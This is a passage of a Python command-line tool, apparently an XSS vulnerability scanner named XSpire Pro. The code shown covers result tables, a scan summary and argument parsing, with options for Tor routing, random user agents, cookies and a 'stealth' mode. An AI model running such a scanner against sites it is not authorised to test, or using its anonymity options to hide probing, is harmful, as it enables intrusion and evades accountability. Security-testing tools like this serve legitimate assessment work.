                ws_result = scan_websocket(ws_url, payload_dict['payload'], proxy)
                ws_result['payload_type'] = 'WebSocket'
                ws_result['risk'] = payload_dict.get('risk', 'High')
                results.append(ws_result)
    
    duration = time.time() - start_time
    
    scan_meta = {
        'protections': protections,
        'duration': duration,
        'crawled_urls': len(crawled_data['urls']) if crawl else 0,
        'forms_found': len(crawled_data['forms']) if crawl else 0,
        'websockets_found': len(crawled_data['websockets']) if crawl else 0
    }
    
    return results, scan_meta

def print_results(results):
    """Print scan results in a formatted table"""
    # Group results by parameter
    param_groups = {}
    for result in results:
        param = result.get('url', result['parameter'])
        if param not in param_groups:
            param_groups[param] = []
        param_groups[param].append(result)
    
    # Print tables for each parameter
    for param, param_results in param_groups.items():
        table = Table(title=f"[bold]XSS Results for: {param}[/bold]", box=box.ROUNDED)
        table.add_column("Payload Type", style="cyan")
        table.add_column("Payload", style="blue", no_wrap=True)
        table.add_column("Reflection Points", style="magenta")
        table.add_column("Risk", style="bold")
        table.add_column("Status", style="bold")
        
        vulnerable_found = False
        
        for result in param_results:
            if result['status'] == 'VULNERABLE':
                vulnerable_found = True
                status_style = "[bold green]VULNERABLE[/bold green]"
                reflection_points = "[bold]" + ", ".join(result['reflection_points'][:2]) + ("..." if len(result['reflection_points']) > 2 else "") + "[/bold]"
            else:
                status_style = "[red]Not Vulnerable[/red]"
                reflection_points = ", ".join(result['reflection_points'][:2]) + ("..." if len(result['reflection_points']) > 2 else "")
            
            risk_style = {
                'High': '[bold red]High[/bold red]',
                'Medium': '[bold yellow]Medium[/bold yellow]',
                'Low': '[bold green]Low[/bold green]'
            }.get(result.get('risk', 'Medium'), '[bold yellow]Medium[/bold yellow]')
            
            table.add_row(
                result['payload_type'],
                result['payload'][:30] + "..." if len(result['payload']) > 30 else result['payload'],
                reflection_points,
                risk_style,
                status_style
            )
        
        # Highlight vulnerable parameters
        if vulnerable_found:
            console.print(Panel.fit(f"Target: [bold red]{param}[/bold red]", style="red"))
        else:
            console.print(Panel.fit(f"Target: [green]{param}[/green]", style="green"))
        
        console.print(table)
    
    # Print summary
    vuln_count = sum(1 for r in results if r['status'] == 'VULNERABLE')
    risk_counts = {
        'High': sum(1 for r in results if r.get('status') == 'VULNERABLE' and r.get('risk') == 'High'),
        'Medium': sum(1 for r in results if r.get('status') == 'VULNERABLE' and r.get('risk') == 'Medium'),
        'Low': sum(1 for r in results if r.get('status') == 'VULNERABLE' and r.get('risk') == 'Low')
    }
    
    console.print(Panel(
        f"[bold]Scan Summary:[/bold]\n"
        f"Total Payloads Tested: [cyan]{len(results)}[/cyan]\n"
        f"Vulnerable Payloads: [{'red' if vuln_count > 0 else 'green'}]{vuln_count}[/{'red' if vuln_count > 0 else 'green'}]\n"
        f"High Risk: [red]{risk_counts['High']}[/red], "
        f"Medium Risk: [yellow]{risk_counts['Medium']}[/yellow], "
        f"Low Risk: [green]{risk_counts['Low']}[/green]",
        title="[bold]Scan Complete[/bold]"
    ))

if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(description=f"XSpire Pro - Advanced XSS Scanner (Version: {VERSION})")
    parser.add_argument("--url", help="Target URL (GET)")
    parser.add_argument("--post", help="Target POST URL")
    parser.add_argument("--data", help="POST data template (e.g. user=admin&pass=test)")
    parser.add_argument("--params", help="Custom parameters to test (comma-separated)")
    parser.add_argument("--proxy", help="Proxy to use (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--tor", action="store_true", help="Use Tor for anonymity")
    parser.add_argument("--user-agent", help="Custom User-Agent string")
    parser.add_argument("--random-agent", action="store_true", help="Use random User-Agent")
    parser.add_argument("--cookies", help="Cookies to send (e.g. session=abc123;token=xyz)")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (slower)")
    parser.add_argument("--crawl", action="store_true", help="Enable auto-crawling of the site")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads to use (1-20)")
    parser.add_argument("--report", help="Generate HTML report with this filename")
    parser.add_argument("--list-files", action="store_true", help="Display the directory structure and payload files")
    parser.add_argument("--help-commands", action="store_true", help="Show all available commands with descriptions")
    args = parser.parse_args()

    if args.help_commands:
        display_commands()
        exit()

    if args.list_files:
        list_files()
        exit()

    # Validate threads parameter
    if args.threads < 1 or args.threads > 20:
        console.print(Panel("[red]Error:[/red] Threads must be between 1 and 20", style="red"))
        exit()

    # Configure Tor if requested
    tor_manager = None
    if args.tor:
        try:
            tor_manager = TorManager()
            args.proxy = tor_manager.proxy
            console.print("[yellow]Using Tor for anonymity...[/yellow]")
            tor_manager.renew_tor_identity()
        except Exception as e:
            console.print(Panel(f"[red]Tor initialization failed:[/red] {str(e)}", style="red"))
            exit()

    # Configure User-Agent
    user_agent = args.user_agent
    if args.random_agent:
        try:
            ua = UserAgent()
            user_agent = ua.random
            console.print(f"[yellow]Using random User-Agent: {user_agent}[/yellow]")
        except Exception as e:
            console.print(f"[yellow]Warning: Could not generate random User-Agent: {e}[/yellow]")
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    # Configure cookies
    cookies = {}
    if args.cookies:
        try:
            cookies = dict(item.strip().split("=", 1) for item in args.cookies.split(";") if "=" in item)
            console.print(f"[yellow]Using cookies: {cookies}[/yellow]")
        except Exception as e:
            console.print(f"[yellow]Warning: Could not parse cookies: {e}[/yellow]")

    # Perform scan
    results = []
    scan_params = {
        'url': args.url or args.post,
        'type': 'POST' if args.post else 'GET',
        'params': args.params.split(",") if args.params else None,
        'user_agent': user_agent,
        'proxy': args.proxy,
        'stealth': args.stealth,
        'crawl': args.crawl,
        'threads': args.threads
    }

    try:
        if args.url:
            results, scan_meta = scan_get(
                args.url,
                params=args.params.split(",") if args.params else None,
                stealth=args.stealth,
                proxy=args.proxy,
                user_agent=user_agent,
                cookies=cookies,
                threads=args.threads,
                crawl=args.crawl
            )
        elif args.post:
            data_template = dict(item.strip().split("=", 1) for item in args.data.split("&")) if args.data else None
            results, scan_meta = scan_post(
                args.post,
                data_template=data_template,
                params=args.params.split(",") if args.params else None,
                stealth=args.stealth,
                proxy=args.proxy,
                user_agent=user_agent,
                cookies=cookies,
                threads=args.threads,
                crawl=args.crawl
            )
        else:
            console.print(Panel("[bold red]Usage Error:[/bold red] You must provide either --url or --post", style="red"))
            exit()

        # Print and save results
        if results:
            scan_params.update(scan_meta)
            scan_params['payload_count'] = len(results)
            
            print_results(results)
            
            if args.report:
                report_path = generate_html_report(results, scan_params, args.report)
                console.print(Panel(f"[green]HTML report generated:[/green] [blue]{report_path}[/blue]", 
                                  title="[bold]Report Generated[/bold]"))

    except KeyboardInterrupt:
        console.print(Panel("[red]Scan interrupted by user[/red]", style="red"))
    except Exception as e:
        console.print(Panel(f"[red]Error during scanning:[/red] {str(e)}", style="red"))